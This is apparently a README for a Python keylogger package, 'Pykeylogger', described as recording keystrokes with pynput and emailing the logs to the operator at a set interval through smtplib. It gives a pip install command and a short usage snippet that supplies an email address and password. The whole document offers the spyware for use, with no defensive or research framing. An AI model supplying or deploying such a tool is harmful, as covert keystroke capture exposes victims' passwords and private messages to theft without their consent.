# A simple keylogger

#### This is a simple keylogger that is built using the libraries: pynput and stmplib, 
#### and some other built-in modules for sending emails.
#### It will record the key and send the log to you through email

## How to install it?

You can do:

"""
pip install Pykeylogger
"""

to install pykeylogger...

## How to use it?

code example:

"""
from Pykeylogger import keylogger


logger = keylogger.KeyLogger(interval=50, email="pykeylogger@pykeylogger.com", passwd="Pykeylogger123")
logger.run()
"""

simple!
interval = how long do you want to wait to send the log of the keys to you
email = the email you want to send to log to
passwd = password of the email



yeyeyeye! Thank you!